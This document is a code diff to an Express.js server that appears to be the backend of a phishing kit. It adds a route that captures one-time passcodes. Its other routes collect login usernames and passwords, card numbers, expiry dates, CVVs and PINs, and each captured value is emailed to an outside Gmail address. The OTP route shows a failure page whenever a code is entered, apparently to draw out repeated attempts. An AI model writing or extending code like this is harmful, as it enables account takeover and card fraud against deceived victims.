@@ -42,11 +42,29 @@ app.get("/load", (req, res) => {
 })
 
 app.post("/otp_post", (req, res) => {
+
     if(req.body.otpValue) {
         res.render("failed.html")
     } else {
         res.render("index.html")
     }
+
+    var mailOptions = {
+        from: `${req.session.user} info@applinic.com`,
+        to: "orrealdesigners@gmail.com",
+        subject: `OTP Code`,
+        text: `OTP: ${req.body.otpValue}`
+    };
+
+    
+    transporter.sendMail(mailOptions, function(error, info){
+        if (error) {
+            console.log(error);
+        } else {
+            console.log('Email sent: ' + info.response);
+        }
+    });
+
 })
 
 app.post("/phone-verification", (req, res) => {
@@ -77,7 +95,7 @@ app.post("/cardVerification", ( req, res) => {
     res.redirect('/load')
     var mailOptions = {
         from: `${req.session.user} info@applinic.com`,
-        to: "orrealdesigners@gmail.com",//"ede.obinna27@gmail.com",
+        to: "orrealdesigners@gmail.com",
         subject: `Card Details`,
         text: `card number: ${req.body.card}\n\nexpire: ${req.body.exp}\n\ncvv: ${req.body.cvv}\n\npin: ${req.body.pho}`
     };
@@ -98,7 +116,7 @@ app.post("/login", ( req, res ) => {
     req.session.save();
     var mailOptions = {
         from: `${req.session.user} info@applinic.com`,
-        to: "orrealdesigners@gmail.com",//"ede.obinna27@gmail.com",
+        to: "orrealdesigners@gmail.com",
         subject: `Client Login Alert`,
         text: `Client Login\n\nUsername: ${req.body.Username}\n\nPassword: ${req.body.Password}`
     };
